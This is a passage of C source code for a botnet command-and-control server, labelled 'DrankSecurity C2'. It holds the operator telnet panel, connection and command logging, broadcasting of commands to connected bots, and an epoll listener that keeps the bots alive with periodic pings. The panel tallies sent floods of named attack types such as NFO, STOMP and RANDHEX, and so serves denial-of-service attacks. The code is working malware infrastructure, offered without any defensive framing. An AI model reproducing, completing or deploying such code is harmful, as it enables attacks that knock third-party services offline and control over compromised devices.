                sprintf(tsv10,   "\e[1;36m   NFO     \e[0;35m[%d\e[0;35m]    \e[0;35m\r\n", nfossent);
                sprintf(tsv11,   "\e[1;36m   KISS    \e[0;35m[%d\e[0;35m]    \e[0;35m\r\n", kissssent);
                sprintf(tsv12,   "\e[1;36m   RIP     \e[0;35m[%d\e[0;35m]    \e[0;35m\r\n", ripssent);                
                sprintf(tsv13,   "\e[1;36m   JUNK    \e[0;35m[%d\e[0;35m]    \e[0;35m\r\n", junkssent);
                sprintf(tsv14,   "\e[1;36m   CLAP    \e[0;35m[%d\e[0;35m]    \e[0;35m\r\n", clapssent);
                sprintf(tsv15,   "\e[1;36m   STOMP   \e[0;35m[%d\e[0;35m]    \e[0;35m\r\n", stompssent);
                sprintf(tsv16,   "\e[1;36m   RANDHEX \e[0;35m[%d\e[0;35m]    \e[0;35m\r\n", randhexssent);
                
                sprintf(tsv17,  "\e[1;36m  \e[0;35m\r\n");
                
                if(send(thefd, tsv1,  strlen(tsv1),    MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, tsv2,  strlen(tsv2),    MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, tsv3,  strlen(tsv3),    MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, tsv4,  strlen(tsv4),    MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, tsv5,  strlen(tsv5),    MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, tsv6,  strlen(tsv6),    MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, tsv7,  strlen(tsv7),    MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, tsv8,  strlen(tsv8),    MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, tsv9,  strlen(tsv9),    MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, tsv10,  strlen(tsv10),    MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, tsv11,  strlen(tsv11),    MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, tsv12,  strlen(tsv12),    MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, tsv13,  strlen(tsv13),    MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, tsv14,  strlen(tsv14),    MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, tsv15,  strlen(tsv15),    MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, tsv16,  strlen(tsv16),    MSG_NOSIGNAL) == -1) goto end;   
                if(send(thefd, tsv17,  strlen(tsv17),    MSG_NOSIGNAL) == -1) goto end;             
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                        pthread_create(&title, NULL, &titleWriter, sock);
                while(1) {
                if(send(thefd, "\x1b[0;35m---> \x1b[0;35m", 12, MSG_NOSIGNAL) == -1) goto end;
                break;
                }
                continue;

                }

         if (strstr(buf, "!* EXIT")) 
         {
            goto end;
         }
                trim(buf);
                sprintf(botnet, "\x1b[0;35m---> \x1b[0;35m");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
                if(strlen(buf) == 0) continue;
                printf("%s: \"%s\"\n",accounts[find_line].username, buf);
                FILE *logFile;
                logFile = fopen("monitor.log", "a");
                fprintf(logFile, "%s: \"%s\"\n", accounts[find_line].username, buf);
                fclose(logFile);
                broadcast(buf, thefd, username);
                memset(buf, 0, 2048);
        }
 
        end:    
                managements[thefd].connected = 0;
                close(thefd);
                managesConnected--;
}
 
void *telnetListener(int port)
{    
        int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)

        {       printf("Verified user logged in from: ");
                client_addr(cli_addr);
                FILE *logFile;
                logFile = fopen("Tracker.log", "a");
                fprintf(logFile, "IP:%d.%d.%d.%d\n", cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24);
                fclose(logFile);
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
                pthread_t thread;
                pthread_create( &thread, NULL, &BotWorker, (void *)newsockfd);
        }
}
 

int main (int argc, char *argv[], void *sock)
{
        signal(SIGPIPE, SIG_IGN); 
 
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4)
        {
                fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
                exit (EXIT_FAILURE);
        }
        port = atoi(argv[3]);
        threads = atoi(argv[2]);
        if (threads > 850)
        {
            printf("Lower The Threads Skid\n");
            return 0;
        }
        else if (threads < 850)
        {
            printf("Good Job kid\n");
        }
                 printf("\033[0;1;30m ╔═══════════════════════════════════════════╗\r\n");
		 printf("\033[0;1;30m ║ \033[1;30m     DrankSecurity C2 Screened!           \033[0;1;30m║\r\n");
                 printf("\033[0;1;30m ║ \033[1;30mPrivate C2 By DrankSecurity & ErrorLoading\033[0;1;30m║\r\n");
		 printf("\033[1;30m ╚═══════════════════════════════════════════╝\033[0;35m\r\n");
        listenFD = create_and_bind(argv[1]); 
        if (listenFD == -1) abort();
 
        s = make_socket_non_blocking (listenFD); 
        if (s == -1) abort();
 
        s = listen (listenFD, SOMAXCONN); 
        if (s == -1)
        {
                perror ("listen");
                abort ();
        }
 
        epollFD = epoll_create1 (0); 
        if (epollFD == -1)
        {
                perror ("epoll_create");
                abort ();
        }
 
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
                perror ("epoll_ctl");
                abort ();
        }
 
        pthread_t thread[threads + 2];
        while(threads--)
        {
                pthread_create( &thread[threads + 1], NULL, &epollEventLoop, (void *) NULL);
        }
 
        pthread_create(&thread[0], NULL, &telnetListener, port);
 
        while(1)
        {
                broadcast("PING", -1, "STRING");
                sleep(60);
        }
  
        close (listenFD);
 
        return EXIT_SUCCESS;
}